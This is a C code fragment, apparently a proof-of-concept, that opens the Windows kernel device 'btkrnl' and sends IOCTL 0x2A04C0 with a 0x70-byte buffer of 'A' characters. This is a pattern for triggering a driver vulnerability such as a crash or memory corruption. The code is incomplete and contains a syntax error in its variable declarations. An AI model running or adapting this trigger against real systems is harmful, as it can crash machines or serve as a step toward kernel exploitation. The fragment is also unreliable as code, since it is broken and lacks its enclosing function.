HANDLE   hDevice;
    char *inbuff, *outbuff;
    DWORD ioctl, len,;
 
    if ( (hDevice = CreateFileA("\\\\.\\btkrnl",
                                              0,
                                              0,
                                              0,
                                              OPEN_EXISTING,
                                              0,
                                              NULL) ) != INVALID_HANDLE_VALUE )
    {
            printf("Device succesfully opened!\n");
    }
    else
    {
            printf("Error: Error opening device \n");
            return 0;
    }
    inbuff = (char*)malloc(0x12000);
    if(!inbuff){
            printf("malloc failed!\n");
            return 0;
    }
    outbuff = (char*)malloc(0x12000);
    if(!outbuff){
            printf("malloc failed!\n");
            return 0;
    }
        ioctl = 0x2A04C0;
        memset(inbuff, 0x41, 0x70);    
        DeviceIoControl(hDevice, ioctl, (LPVOID)inbuff, 0x70, (LPVOID)outbuff, 0x70, &len, NULL);
 
